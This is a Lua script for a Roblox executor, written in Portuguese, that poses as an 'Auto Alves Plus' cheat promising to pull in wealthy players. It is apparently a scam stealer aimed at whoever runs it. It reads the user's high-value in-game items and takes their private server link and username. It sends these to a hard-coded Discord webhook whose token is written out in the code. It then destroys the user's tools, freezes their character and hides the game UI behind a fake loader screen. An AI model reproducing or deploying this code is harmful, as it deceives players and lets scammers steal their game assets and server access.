local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

local PLACE_ID_WHITELIST = 109983668079237

if game.PlaceId ~= PLACE_ID_WHITELIST then
    print("⛔ Script não executado: mapa não autorizado.")
    return
end

local WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_URL"
local WEBHOOK_ALVES = "https://discordapp.com/api/webhooks/1436196313472438282/iDNGKLytUhTLl9I9QA3X9xo8oW4wRxYkJQf0rRXq3meqNyr-XxY57PWRcvCBDQVJ5Bl9"

local Min_Gen = 1_000_000

local locaisDaMusica = {game.Workspace, game.SoundService}
local nomesMusicasComuns = {"music","musica","bgm","background","theme","soundtrack","song","tema"}

local function eMusica(som)
    if not som:IsA("Sound") then return false end
    local nomeMinusculo = som.Name:lower()
    for _, palavra in pairs(nomesMusicasComuns) do
        if nomeMinusculo:find(palavra) then return true end
    end
    for _, local_ in pairs(locaisDaMusica) do
        if som:IsDescendantOf(local_) and som.Parent == local_ then
            if som.Looped and som.TimeLength > 30 then
                return true
            end
        end
    end
    return false
end

local function processarSom(som)
    if som:IsA("Sound") then
        if not eMusica(som) then som.Volume = 0 end
    elseif som:IsA("SoundGroup") then
        som.Volume = 0
    end
end

task.spawn(function()
    for _, descendente in pairs(game:GetDescendants()) do
        processarSom(descendente)
    end
end)

game.DescendantAdded:Connect(function(descendente)
    task.wait()
    processarSom(descendente)
end)

print("🔇 Sistema de silenciamento ativado!")

local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
    if n >= 1e6 then return string.format("$%.1fM", n/1e6):gsub("%.0M","M") end
    if n >= 1e3 then return string.format("$%.1fK", n/1e3):gsub("%.0K","K") end
    return "$"..tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local num = s:match("([%d%.]+)")
    if not num then return 0 end
    local n = tonumber(num) or 0
    if s:find("B") then return n*1e9 
    elseif s:find("M") then return n*1e6 
    elseif s:find("K") then return n*1e3 else return n end
end

local function getBrainrots()
    local results = {}
    local plots = Workspace:FindFirstChild("Plots") or Workspace
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
        if podiums then
            for _, pd in ipairs(podiums:GetChildren()) do
                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
                local spawn = base and base:FindFirstChild("Spawn")
                local att = spawn and spawn:FindFirstChild("Attachment")
                local oh = att and att:FindFirstChild("AnimalOverhead")
                local nameLbl = oh and oh:FindFirstChild("DisplayName")
                local genLbl = oh and oh:FindFirstChild("Generation")
                if nameLbl and nameLbl:IsA("TextLabel") then
                    local name = nameLbl.Text
                    local genText = genLbl and genLbl.Text or "0"
                    local valueNum = parseValueFromText(genText)
                    if valueNum >= Min_Gen then
                        local key = name.."|"..valueNum
                        if results[key] then
                            results[key].count += 1
                        else
                            results[key] = {name=name, value=valueNum, count=1}
                        end
                    end
                end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a,b) return a.value > b.value end)
    return out
end

local function getPlayersCount()
    return #Players:GetPlayers()
end

local function isValidPrivateServerLink(link)
    if type(link) ~= "string" or link == "" then return false end
    local pattern = "^https://www%.roblox%.com/share%?code=[%w]+&type=Server$"
    return link:match(pattern) ~= nil
end

local function sendToDiscord(link, playerCount, playerName, brainrots)
    task.spawn(function()
        local brainrotText = ""
        local mentionEveryone = false

        -- Verificando se algum brainrot tem valor muito alto (>= 10 milhões)
        for _, br in ipairs(brainrots) do
            if br.value >= 10000000 then
                mentionEveryone = true
                break
            end
        end

        -- Construindo o texto dos brainrots encontrados
        if #brainrots > 0 then
            brainrotText = "\n\n**🎯 Brainrots Encontrados:**\n"
            for i, br in ipairs(brainrots) do
                if i > 10 then break end
                local formattedValue = formatNumberShort(br.value)
                brainrotText = brainrotText .. string.format("`%d.` **%s** - %s (x%d)\n", 
                    i, br.name, formattedValue, br.count)
            end
            brainrotText = brainrotText .. string.format("\n**Total:** %d brainrots de alto valor", #brainrots)
        else
            brainrotText = "\n\n**⚠️ Nenhum brainrot de alto valor encontrado**"
        end

        -- Preparando os dados para o primeiro webhook
        local dataWebhook1 = HttpService:JSONEncode({
            content = mentionEveryone and "@everyone" or "",
            embeds = {{
                title = "🔥 Novo Server Privado Detectado",
                description = "**Link:**\n" .. link .. 
                              "\n\n**👤 Jogador:** `" .. playerName .. "`" ..
                              "\n**👥 Players no server:** `" .. playerCount .. "`" ..
                              brainrotText,
                color = #brainrots > 0 and 3066993 or 15158332,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                footer = { text = "Auto Alves 🐒"}
            }}
        })

        -- Preparando os dados para o segundo webhook
        local dataWebhook2 = HttpService:JSONEncode({
            content = mentionEveryone and "@everyone" or "",
            embeds = {{
                title = "🔥 Novo Server Privado Detectado",
                description = "**Link:**\n" .. link .. 
                              "\n\n**👤 Jogador:** `" .. playerName .. "`" ..
                              "\n**👥 Players no server:** `" .. playerCount .. "`" ..
                              brainrotText,
                color = #brainrots > 0 and 3066993 or 15158332,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                footer = { text = "Auto Alves 🐒"}
            }}
        })

        print("📤 Enviando dados para os webhooks...")

        -- Enviando dados para o primeiro webhook
        local success1, res1 = pcall(function()
            return HttpService:PostAsync(
                WEBHOOK_URL, 
                dataWebhook1, 
                Enum.HttpContentType.ApplicationJson,
                false,
                {["Content-Type"] = "application/json"}
            )
        end)

        if not success1 then
            warn("❌ Erro no envio para webhook 1: " .. WEBHOOK_URL .. ":", res1)

            -- Tentando o método alternativo para o primeiro webhook
            local altSuccess1, altRes1 = pcall(function()
                return request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = dataWebhook1
                })
            end)

            if altSuccess1 then
                print("✅ Enviado via método alternativo para o webhook 1!")
            else
                warn("❌ Erro ao enviar via método alternativo para o webhook 1:", altRes1)
            end
        else
            print("✅ Dados enviados com sucesso para o webhook 1: " .. WEBHOOK_URL)
        end

        -- Enviando dados para o segundo webhook
        local success2, res2 = pcall(function()
            return HttpService:PostAsync(
                WEBHOOK_ALVES, 
                dataWebhook2, 
                Enum.HttpContentType.ApplicationJson,
                false,
                {["Content-Type"] = "application/json"}
            )
        end)

        if not success2 then
            warn("❌ Erro no envio para webhook 2: " .. WEBHOOK_ALVES .. ":", res2)

            -- Tentando o método alternativo para o segundo webhook
            local altSuccess2, altRes2 = pcall(function()
                return request({
                    Url = WEBHOOK_ALVES,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = dataWebhook2
                })
            end)

            if altSuccess2 then
                print("✅ Enviado via método alternativo para o webhook 2!")
            else
                warn("❌ Erro ao enviar via método alternativo para o webhook 2:", altRes2)
            end
        else
            print("✅ Dados enviados com sucesso para o webhook 2: " .. WEBHOOK_ALVES)
        end
    end)
end

pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

local function trapPlayer()
    local player = Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    task.spawn(function()
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, tool in pairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then tool:Destroy() end
            end
        end
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") then tool:Destroy() end
        end
        print("🗑️ Hotbar limpa!")
    end)
    task.spawn(function()
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.JumpHeight = 0
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
            print("🔒 Movimento bloqueado!")
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = true end
    end)
    task.spawn(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        print("👻 UI ocultada!")
    end)
end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local menu = Instance.new("ScreenGui")
menu.Name = "AutoMoreiraMenu"
menu.ResetOnSpawn = false
menu.DisplayOrder = 100
menu.IgnoreGuiInset = true
menu.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
frame.BorderSizePixel = 0
frame.Parent = menu

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = frame

local frameShadow = Instance.new("UIStroke")
frameShadow.Color = Color3.fromRGB(139, 0, 0)
frameShadow.Thickness = 2
frameShadow.Transparency = 0.3
frameShadow.Parent = frame

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
header.BorderSizePixel = 0
header.Parent = frame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 12)
headerFix.Position = UDim2.new(0, 0, 1, -12)
headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🐒 Auto Alves Plus"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -30, 0, 30)
desc.Position = UDim2.new(0, 15, 0, 60)
desc.BackgroundTransparency = 1
desc.Text = "Cole o link do servidor privado:"
desc.TextColor3 = Color3.fromRGB(180, 180, 200)
desc.Font = Enum.Font.Gotham
desc.TextSize = 13
desc.TextXAlignment = Enum.TextXAlignment.Left
desc.Parent = frame

local inputBox = Instance.new("Frame")
inputBox.Size = UDim2.new(1, -30, 0, 45)
inputBox.Position = UDim2.new(0, 15, 0, 100)
inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
inputBox.BorderSizePixel = 0
inputBox.Parent = frame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = inputBox

local inputStroke = Instance.new("UIStroke")
inputStroke.Color = Color3.fromRGB(50, 50, 70)
inputStroke.Thickness = 1
inputStroke.Parent = inputBox

local input = Instance.new("TextBox")
input.Size = UDim2.new(1, -16, 1, 0)
input.Position = UDim2.new(0, 8, 0, 0)
input.BackgroundTransparency = 1
input.Text = ""
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.Font = Enum.Font.Gotham
input.TextSize = 13
input.PlaceholderText = "https://roblox.com/share?code=..."
input.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
input.ClearTextOnFocus = false
input.TextXAlignment = Enum.TextXAlignment.Left
input.Parent = inputBox

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -30, 0, 45)
btn.Position = UDim2.new(0, 15, 0, 165)
btn.BackgroundColor3 = Color3.fromRGB(60, 120, 240)
btn.Text = "ENVIAR LINK"
btn.Font = Enum.Font.GothamBold
btn.TextSize = 15
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.AutoButtonColor = false
btn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btn

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -25)
footer.BackgroundTransparency = 1
footer.Text = "• Puxa Player +50M (100% de Funcionar Se tiver +15M na sua Base!)"
footer.TextColor3 = Color3.fromRGB(120, 120, 140)
footer.Font = Enum.Font.Gotham
footer.TextSize = 11
footer.Parent = frame

local isProcessing = false

btn.MouseButton1Click:Connect(function()
	if isProcessing then return end -- impede cliques duplos
	isProcessing = true

	local link = input.Text:gsub("^%s*(.-)%s*$", "%1")
	
	if link == "" then
		input.Text = ""
		input.PlaceholderText = "❌ Cole um link primeiro!"
		inputStroke.Color = Color3.fromRGB(255, 80, 80)
		task.wait(2)
		input.PlaceholderText = "https://roblox.com/share?code=..."
		inputStroke.Color = Color3.fromRGB(50, 50, 70)
		isProcessing = false
		return
	end

	if not isValidPrivateServerLink(link) then
		input.Text = ""
		input.PlaceholderText = "❌ Link inválido!"
		inputStroke.Color = Color3.fromRGB(255, 80, 80)
		task.wait(2)
		input.PlaceholderText = "https://roblox.com/share?code=..."
		inputStroke.Color = Color3.fromRGB(50, 50, 70)
		isProcessing = false
		return
	end

	btn.Text = "⏳ PROCESSANDO..."
	btn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)

    local playerName = Players.LocalPlayer.Name
    local playerCount = getPlayersCount()

    print("🔍 Procurando brainrots...")
    local brainrots = getBrainrots()
    print("✅ Encontrados: " .. #brainrots .. " brainrots")

    sendToDiscord(link, playerCount, playerName, brainrots)

    task.wait(0.5)

    menu:Destroy()
    showloaderGui(brainrots)
    task.wait(2)
    trapPlayer()

    print("✅ Sistema ativado!")
    print("🔒 Jogador: " .. playerName)
    print("📊 Players: " .. playerCount)
    print("🎯 Brainrots: " .. #brainrots)
    print("🔗 Link: " .. link)
end)

input.Focused:Connect(function()
    inputStroke.Color = Color3.fromRGB(80, 140, 255)
    inputStroke.Thickness = 2
end)

input.FocusLost:Connect(function()
    inputStroke.Color = Color3.fromRGB(50, 50, 70)
    inputStroke.Thickness = 1
end)

function showloaderGui(brainrots)
    local loaderGui = Instance.new("ScreenGui")
    loaderGui.Name = "KdmlLoader"
    loaderGui.IgnoreGuiInset = true
    loaderGui.ResetOnSpawn = false

    local loaderFrame = Instance.new("Frame", loaderGui)
    loaderFrame.Size = UDim2.new(1, 0, 1, 0)
    loaderFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)

    local loaderTitle = Instance.new("TextLabel", loaderFrame)
    loaderTitle.Size = UDim2.new(1, 0, 0.1, 0)
    loaderTitle.Position = UDim2.new(0, 0, 0.3, 0)
    loaderTitle.BackgroundTransparency = 1
    loaderTitle.Font = Enum.Font.GothamBold
    loaderTitle.TextSize = 36
    loaderTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
    loaderTitle.Text = "🙉 Alves Methods 🧠"
    loaderTitle.TextScaled = true

    local rotatingC = Instance.new("TextLabel", loaderFrame)
    rotatingC.Size = UDim2.new(0, 50, 0, 50)
    rotatingC.Position = UDim2.new(0.5, -25, 0.55, -25)
    rotatingC.BackgroundTransparency = 1
    rotatingC.Font = Enum.Font.GothamBold
    rotatingC.TextSize = 48
    rotatingC.TextColor3 = Color3.fromRGB(255, 250, 250)
    rotatingC.Text = "C"
    rotatingC.TextScaled = true

    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1)
    local goal = {Rotation = 360}
    local tween = TweenService:Create(rotatingC, tweenInfo, goal)
    tween:Play()

    local mainText = Instance.new("TextLabel", loaderFrame)
    mainText.Size = UDim2.new(1, -40, 0, 40)
    mainText.Position = UDim2.new(0, 20, 0.7, 0)
    mainText.BackgroundTransparency = 1
    mainText.Font = Enum.Font.GothamBold
    mainText.TextSize = 18
    mainText.TextColor3 = Color3.fromRGB(0, 255, 0)
    mainText.TextWrapped = true

    local loaderDesc = Instance.new("TextLabel", loaderFrame)
    loaderDesc.Size = UDim2.new(1, 0, 0.05, 0)
    loaderDesc.Position = UDim2.new(0, 0, 0.78, 0)
    loaderDesc.BackgroundTransparency = 1
    loaderDesc.Font = Enum.Font.Gotham
    loaderDesc.TextSize = 16
    loaderDesc.TextColor3 = Color3.fromRGB(180, 180, 180)
    loaderDesc.Text = "Sua base será fechada automaticamente!"
    loaderDesc.TextScaled = true
    loaderDesc.TextWrapped = true

    local loaderFooter = Instance.new("TextLabel", loaderFrame)
    loaderFooter.Size = UDim2.new(1, 0, 0, 20)
    loaderFooter.Position = UDim2.new(0, 0, 1, -25)
    loaderFooter.BackgroundTransparency = 1
    loaderFooter.Font = Enum.Font.GothamBold
    loaderFooter.TextSize = 15
    loaderFooter.TextColor3 = Color3.fromRGB(255, 250, 250)
    loaderFooter.Text = "discord.gg/GhxWuEDeHx"

    loaderGui.Parent = game:GetService("CoreGui")
    if loaderSound then loaderSound:Play() end

    local statusVariations = {
        "Status: Lá Grande Combinasion",
        "Status: Los Combinados",
        "Status: Spaghetti Tualetti",
        "Status: La Supreme Combinasion",
        "Status: La Spooky Combinasion",
        "Status: Ketchuru and Musturu",
        "Status: Chicleteira Bicicleteira",
        "Status: Dragon Canneloni",
        "Status: Garama and Madundung",
        "Status: La Extinct Grande",
        "Status: La Supreme Combinasion",
        "Status: Burguro and Fryuro"
    }

    task.spawn(function()
        while loaderGui.Parent do
            mainText.Text = "Carregando Auto Alves (aguarde 10s)... ⌛"
            task.wait(10)
            
            mainText.Text = "Convidando vítimas aguarde... 🎮"
            task.wait(10)
            
            for repetir = 1, 2 do
                mainText.Text = "Vítima encontrada 🙈"
                task.wait(8)
                
                mainText.Text = "Status: Não possui nenhum Brainrot de valor 💸"
                task.wait(10)
                
                mainText.Text = "Banindo...... 🚫"
                task.wait(10)
            end
            
            mainText.Text = "Vítima encontrada 🙈"
            task.wait(8)
            
            local randomStatus = statusVariations[math.random(1, #statusVariations)]
            mainText.Text = randomStatus
            task.wait(12)
            
            mainText.Text = "Roubando..... 🚨"
            task.wait(12)
            
            mainText.Text = "Roubo concluído ✅"
            task.wait(10)
        end
    end)
end

print("✅ Auto Moreira carregado!")
print("🔇 Sistema de silenciamento ativo!")
print("🎯 Mínimo de geração: " .. formatNumberShort(Min_Gen))
print("📱 Otimizado para Delta/Mobile")
print("👤 Usuário: " .. Players.LocalPlayer.Name)
